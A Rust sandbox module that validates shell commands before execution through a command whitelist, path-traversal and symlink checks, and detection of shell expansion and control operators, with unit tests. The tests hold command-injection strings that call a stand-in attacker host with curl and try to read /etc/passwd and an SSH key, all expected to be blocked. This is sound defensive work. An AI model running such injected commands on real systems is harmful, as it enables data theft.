//! Sandbox module for secure command execution
//!
//! This module provides filesystem sandboxing and command whitelisting
//! to safely execute shell commands with restricted access.

/// Configuration structures for sandbox
pub mod config;
/// Network access control
pub mod network;
/// Command whitelist definitions
pub mod whitelist;

use std::path::Path;
use thiserror::Error;

pub use config::SandboxConfig;
pub use whitelist::{Whitelist, extract_command};

/// Sandbox validation errors
#[derive(Debug, Error)]
pub enum SandboxError {
    /// Command not in whitelist
    #[error("Command not in whitelist: {0}")]
    CommandNotAllowed(String),

    /// Path outside workspace
    #[error("Path outside workspace: {0}")]
    PathOutsideWorkspace(String),

    /// Invalid path
    #[error("Invalid path: {0}")]
    InvalidPath(String),

    /// Path traversal detected
    #[error("Path traversal detected: {0}")]
    PathTraversal(String),

    /// Symlink escape detected
    #[error("Symlink escape detected: {0}")]
    SymlinkEscape(String),

    /// Shell expansion detected in argument
    #[error("Shell expansion detected in argument: {0}")]
    ShellExpansion(String),

    /// Shell control operator detected
    #[error("Shell control operator detected: {0}")]
    ShellControlOperator(String),
}

/// Bash command sandbox
#[derive(Debug, Clone)]
pub struct Sandbox {
    config: SandboxConfig,
    whitelist: Whitelist,
}

impl Sandbox {
    /// Create new sandbox with configuration
    #[must_use]
    pub fn new(config: SandboxConfig) -> Self {
        let whitelist = Whitelist::new(config.extra_whitelist.clone());
        Self { config, whitelist }
    }

    /// Validate a command string before execution
    ///
    /// # Errors
    /// Returns `SandboxError::CommandNotAllowed` if command is not in whitelist
    /// Returns `SandboxError::InvalidPath` if command is empty or contains null bytes
    /// Returns `SandboxError::PathTraversal` if command contains path traversal sequences
    /// Returns `SandboxError::PathOutsideWorkspace` if command references paths outside workspace
    /// Returns `SandboxError::ShellExpansion` if command contains dangerous shell expansions
    /// Returns `SandboxError::ShellControlOperator` if command contains shell control operators
    pub fn validate_command(&self, command: &str) -> Result<(), SandboxError> {
        // Extract main command
        let main_cmd = extract_command(command)
            .ok_or_else(|| SandboxError::InvalidPath("Empty command".to_string()))?;

        // Check whitelist
        if !self.whitelist.is_allowed(&main_cmd) {
            return Err(SandboxError::CommandNotAllowed(main_cmd));
        }

        // Check for shell control operators that could bypass security
        if let Some(operator) = contains_shell_control_operator(command) {
            return Err(SandboxError::ShellControlOperator(operator));
        }

        // Validate all paths in command
        self.validate_paths_in_command(command)?;

        Ok(())
    }

    /// Validate that all paths in a command are within allowed directories
    fn validate_paths_in_command(&self, command: &str) -> Result<(), SandboxError> {
        // Parse command arguments respecting shell quoting rules
        let args = parse_shell_args(command);

        for arg in &args {
            // Skip options (start with -)
            if arg.starts_with('-') {
                continue;
            }

            // Skip command name itself
            if self.whitelist.is_allowed(arg) {
                continue;
            }

            // Check for dangerous shell expansions
            if contains_shell_expansion(arg) {
                return Err(SandboxError::ShellExpansion(arg.clone()));
            }

            // Remove surrounding quotes and check if it's a file path
            let cleaned = remove_quotes(arg);
            if looks_like_path(&cleaned) {
                self.validate_path(&cleaned)?;
            }
        }

        Ok(())
    }

    /// Validate a single path
    ///
    /// # Errors
    /// Returns `SandboxError::InvalidPath` if path contains null bytes
    /// Returns `SandboxError::PathTraversal` if path contains path traversal sequences
    /// Returns `SandboxError::PathOutsideWorkspace` if path resolves outside workspace
    /// Returns `SandboxError::SymlinkEscape` if path resolves to a location outside workspace via symlink
    pub fn validate_path(&self, path_str: &str) -> Result<(), SandboxError> {
        // Reject paths with null bytes
        if path_str.contains('\0') {
            return Err(SandboxError::InvalidPath("Null byte in path".to_string()));
        }

        // Check for path traversal attempts
        if path_str.contains("..") {
            return Err(SandboxError::PathTraversal(path_str.to_string()));
        }

        // Parse the path
        let path = Path::new(path_str);

        // Reject absolute paths that aren't in allowed list
        if path.is_absolute() {
            // Check if it's in allowed paths
            for allowed in &self.config.allowed_paths {
                if path.starts_with(allowed) {
                    return Ok(());
                }
            }
            return Err(SandboxError::PathOutsideWorkspace(path_str.to_string()));
        }

        // For relative paths, resolve and check
        let resolved = self.config.workspace_dir.join(path);
        self.validate_resolved_path(&resolved, path_str)
    }

    /// Validate a resolved (absolute) path
    fn validate_resolved_path(&self, resolved: &Path, original: &str) -> Result<(), SandboxError> {
        // Check workspace directory (use non-canonicalized path first)
        let workspace_canonical = self
            .config
            .workspace_dir
            .canonicalize()
            .unwrap_or_else(|_| self.config.workspace_dir.clone());

        // If path doesn't exist yet, check its parent directory
        if !resolved.exists() {
            // For new files, check parent directory is in workspace
            if let Some(parent) = resolved.parent() {
                let parent_canonical = parent
                    .canonicalize()
                    .unwrap_or_else(|_| parent.to_path_buf());
                if !parent_canonical.starts_with(&workspace_canonical) {
                    return Err(SandboxError::PathOutsideWorkspace(original.to_string()));
                }
            }
            return Ok(());
        }

        // Try to canonicalize (follows symlinks)
        let canonical = resolved
            .canonicalize()
            .map_err(|_| SandboxError::InvalidPath(format!("Cannot resolve path: {original}")))?;

        if !canonical.starts_with(&workspace_canonical) {
            return Err(SandboxError::PathOutsideWorkspace(original.to_string()));
        }

        // Check for symlink escape (resolved != canonical means it went through symlink)
        let resolved_canonical = resolved
            .canonicalize()
            .unwrap_or_else(|_| resolved.to_path_buf());
        if resolved_canonical != canonical && !canonical.starts_with(&workspace_canonical) {
            return Err(SandboxError::SymlinkEscape(original.to_string()));
        }

        Ok(())
    }

    /// Get the workspace directory
    #[must_use]
    pub fn workspace_dir(&self) -> &Path {
        &self.config.workspace_dir
    }
}

impl Default for Sandbox {
    fn default() -> Self {
        Self::new(SandboxConfig::default())
    }
}

/// Check if a string contains dangerous shell expansions
/// Detects: variable expansion ($VAR), command substitution ($() or `cmd`),
/// arithmetic expansion ($(( ))), process substitution (<() or >())
fn contains_shell_expansion(s: &str) -> bool {
    // Variable expansion: $VAR or ${VAR}
    if s.contains('$') {
        // Check for various expansion patterns
        if ["$(", "${", "$((", "$["].iter().any(|&p| s.contains(p)) {
            return true;
        }
        // Check for bare $ followed by alphanumeric or _
        if s.chars()
            .collect::<Vec<_>>()
            .windows(2)
            .any(|w| w[0] == '$' && (w[1].is_alphanumeric() || w[1] == '_'))
        {
            return true;
        }
    }

    // Backtick command substitution: `cmd`
    if s.contains('`') {
        return true;
    }

    // Process substitution: <(cmd) or >(cmd)
    if s.contains("<(") || s.contains(">(") {
        return true;
    }

    // Tilde expansion: ~user
    if s.starts_with('~') {
        return true;
    }

    false
}

/// Check if a command string contains shell control operators
/// Returns the first found operator, or None if no operators are found
/// Detects: ; && || | > >> < << &
fn contains_shell_control_operator(command: &str) -> Option<String> {
    // Define operators to check (longer ones first to avoid partial matches)
    let operators = [">>", "<<", "&&", "||", ";", "|", ">", "<", "&"];

    for op in &operators {
        if command.contains(op) {
            return Some(op.to_string());
        }
    }

    None
}

/// Parse shell command arguments respecting quoting rules
/// Handles single quotes, double quotes, and backslash escaping
fn parse_shell_args(command: &str) -> Vec<String> {
    let mut args = Vec::new();
    let mut current = String::new();
    let chars = command.chars();
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut escaped = false;

    for ch in chars {
        if escaped {
            current.push(ch);
            escaped = false;
            continue;
        }

        match ch {
            '\\' if !in_single_quote => {
                escaped = true;
            },
            '\'' if !in_double_quote => {
                in_single_quote = !in_single_quote;
                current.push(ch); // Keep quote in the token
            },
            '"' if !in_single_quote => {
                in_double_quote = !in_double_quote;
                current.push(ch); // Keep quote in the token
            },
            ' ' | '\t' if !in_single_quote && !in_double_quote => {
                if !current.is_empty() {
                    args.push(current.clone());
                    current.clear();
                }
            },
            _ => {
                current.push(ch);
            },
        }
    }

    if !current.is_empty() {
        args.push(current);
    }

    // Skip the command name itself (first argument)
    args.into_iter().skip(1).collect()
}

/// Remove surrounding quotes from a string
fn remove_quotes(s: &str) -> String {
    if (s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')) {
        s[1..s.len() - 1].to_string()
    } else {
        s.to_string()
    }
}

/// Check if a string looks like a file path
fn looks_like_path(s: &str) -> bool {
    // Simple heuristic: contains / or . or is a known file extension
    if s.contains('/') || s.contains('.') {
        return true;
    }

    // Check for common file extensions
    let extensions = [
        "rs",
        "txt",
        "json",
        "toml",
        "md",
        "yaml",
        "yml",
        "sh",
        "py",
        "js",
        "ts",
        "tsx",
        "jsx",
        "css",
        "scss",
        "sass",
        "less",
        "html",
        "htm",
        "xml",
        "ini",
        "conf",
        "config",
        "lock",
        "sum",
        "mod",
        "go",
        "java",
        "kt",
        "scala",
        "rb",
        "php",
        "c",
        "cpp",
        "h",
        "hpp",
        "cs",
        "swift",
        "m",
        "mm",
        "pl",
        "pm",
        "lua",
        "vim",
        "el",
        "elc",
        "hs",
        "lhs",
        "ml",
        "mli",
        "fs",
        "fsx",
        "fsi",
        "csx",
        "vb",
        "fsproj",
        "csproj",
        "vbproj",
        "sln",
        "props",
        "targets",
        "nuspec",
        "resx",
        "settings",
        "xaml",
        "axaml",
        "razor",
        "cshtml",
        "vbhtml",
        "aspx",
        "ascx",
        "ashx",
        "asmx",
        "svc",
        "edmx",
        "dbml",
        "db",
        "sqlite",
        "sqlite3",
        "db3",
        "s3db",
        "sl3",
        "db2",
        "rdb",
        "sql",
        "dump",
        "backup",
        "bak",
        "old",
        "orig",
        "rej",
        "diff",
        "patch",
        "changes",
        "log",
        "out",
        "err",
        "pid",
        "seed",
        "state",
        "status",
        "version",
        "ver",
        "build",
        "builds",
        "dist",
        "lib",
        "libs",
        "bin",
        "obj",
        "target",
        "targets",
        "pkg",
        "package",
        "packages",
        "vendor",
        "vendors",
        "node_modules",
        "bower_components",
        "jspm_packages",
        "typings",
    ];

    std::path::Path::new(s)
        .extension()
        .is_some_and(|ext| extensions.iter().any(|&e| ext.eq_ignore_ascii_case(e)))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn test_validate_allowed_command() {
        let sandbox = Sandbox::default();
        assert!(sandbox.validate_command("git status").is_ok());
        assert!(sandbox.validate_command("ls -la").is_ok());
    }

    #[test]
    fn test_validate_disallowed_command() {
        let sandbox = Sandbox::default();
        assert!(sandbox.validate_command("unknown-cmd").is_err());
        assert!(sandbox.validate_command("evil-script").is_err());
    }

    #[test]
    fn test_validate_path_traversal() {
        let sandbox = Sandbox::default();
        assert!(sandbox.validate_path("../secret.txt").is_err());
        assert!(sandbox.validate_path("foo/../../../etc/passwd").is_err());
    }

    #[test]
    fn test_validate_absolute_path_outside_workspace() {
        let sandbox = Sandbox::default();
        assert!(sandbox.validate_path("/etc/passwd").is_err());
        assert!(sandbox.validate_path("/home/user/.ssh/id_rsa").is_err());
    }

    #[test]
    fn test_validate_quoted_paths() {
        let temp_dir = tempfile::tempdir().expect("Failed to create temp dir");

        let config = SandboxConfig {
            workspace_dir: temp_dir.path().to_path_buf(),
            ..Default::default()
        };
        let sandbox = Sandbox::new(config);

        // Create test file
        fs::write(temp_dir.path().join("test.txt"), "hello").expect("Failed to write file");

        // Valid quoted paths inside workspace
        assert!(sandbox.validate_command("cat 'test.txt'").is_ok());
        assert!(sandbox.validate_command("cat \"test.txt\"").is_ok());

        // Invalid quoted paths outside workspace
        assert!(sandbox.validate_command("cat '/etc/passwd'").is_err());
        assert!(sandbox.validate_command("cat \"/etc/passwd\"").is_err());
    }

    #[test]
    fn test_validate_shell_expansion_blocked() {
        let sandbox = Sandbox::default();

        // Variable expansion
        assert!(sandbox.validate_command("cat $HOME/file").is_err());
        assert!(sandbox.validate_command("cat ${HOME}/file").is_err());

        // Command substitution
        assert!(sandbox.validate_command("cat $(whoami)").is_err());
        assert!(sandbox.validate_command("cat `whoami`").is_err());
        assert!(
            sandbox
                .validate_command("cat \"$(curl attacker.com)\"")
                .is_err()
        );

        // Process substitution
        assert!(sandbox.validate_command("cat <(echo hello)").is_err());

        // Tilde expansion
        assert!(sandbox.validate_command("cat ~/file").is_err());
    }

    #[test]
    fn test_validate_relative_path_inside_workspace() {
        let temp_dir = tempfile::tempdir().expect("Failed to create temp dir");

        let config = SandboxConfig {
            workspace_dir: temp_dir.path().to_path_buf(),
            ..Default::default()
        };
        let sandbox = Sandbox::new(config);

        // Create test file
        fs::write(temp_dir.path().join("test.txt"), "hello").expect("Failed to write file");

        assert!(sandbox.validate_path("test.txt").is_ok());
        assert!(sandbox.validate_path("./test.txt").is_ok());
    }

    #[test]
    fn test_validate_allowed_paths() {
        let temp_dir = tempfile::tempdir().expect("Failed to create temp dir");
        let temp_path = temp_dir.path().to_path_buf();
        let config = SandboxConfig {
            workspace_dir: temp_dir.path().to_path_buf(),
            allowed_paths: vec![temp_path.clone()],
            ..Default::default()
        };
        let sandbox = Sandbox::new(config);

        assert!(
            sandbox
                .validate_path(&format!("{}/file.txt", temp_path.display()))
                .is_ok()
        );
        assert!(sandbox.validate_path("/etc/passwd").is_err());
    }

    #[test]
    fn test_contains_shell_expansion() {
        assert!(contains_shell_expansion("$HOME"));
        assert!(contains_shell_expansion("${HOME}"));
        assert!(contains_shell_expansion("$(whoami)"));
        assert!(contains_shell_expansion("`whoami`"));
        assert!(contains_shell_expansion("<(echo hello)"));
        assert!(contains_shell_expansion("~/file"));
        assert!(!contains_shell_expansion("file.txt"));
        assert!(!contains_shell_expansion("/path/to/file"));
    }

    #[test]
    fn test_parse_shell_args() {
        assert_eq!(parse_shell_args("cat 'file.txt'"), vec!["'file.txt'"]);
        assert_eq!(parse_shell_args("cat \"file.txt\""), vec!["\"file.txt\""]);
        assert_eq!(parse_shell_args("echo hello world"), vec!["hello", "world"]);
        assert_eq!(
            parse_shell_args("cat 'file with spaces.txt'"),
            vec!["'file with spaces.txt'"]
        );
    }

    #[test]
    fn test_remove_quotes() {
        assert_eq!(remove_quotes("'hello'"), "hello");
        assert_eq!(remove_quotes("\"hello\""), "hello");
        assert_eq!(remove_quotes("hello"), "hello");
    }

    #[test]
    fn test_validate_shell_control_operators_blocked() {
        let sandbox = Sandbox::default();

        // Command separator
        assert!(
            sandbox
                .validate_command("echo ok; curl attacker.com")
                .is_err()
        );

        // Pipeline
        assert!(sandbox.validate_command("cat a | curl x").is_err());

        // Redirection
        assert!(sandbox.validate_command("cat a > /tmp/x").is_err());
        assert!(sandbox.validate_command("cat a >> /tmp/x").is_err());
        assert!(sandbox.validate_command("cat a < /tmp/x").is_err());

        // Logical operators
        assert!(sandbox.validate_command("cmd && curl x").is_err());
        assert!(sandbox.validate_command("cmd || curl x").is_err());

        // Background job
        assert!(sandbox.validate_command("cmd &").is_err());
    }

    #[test]
    fn test_contains_shell_control_operator() {
        assert_eq!(
            contains_shell_control_operator("echo ok; curl x"),
            Some(";".to_string())
        );
        assert_eq!(
            contains_shell_control_operator("cat a | curl x"),
            Some("|".to_string())
        );
        assert_eq!(
            contains_shell_control_operator("cat a > file"),
            Some(">".to_string())
        );
        assert_eq!(
            contains_shell_control_operator("cmd && curl x"),
            Some("&&".to_string())
        );
        assert_eq!(
            contains_shell_control_operator("cmd || curl x"),
            Some("||".to_string())
        );
        assert_eq!(
            contains_shell_control_operator("cmd &"),
            Some("&".to_string())
        );
        assert_eq!(contains_shell_control_operator("echo hello"), None);
        assert_eq!(contains_shell_control_operator("ls -la"), None);
    }
}
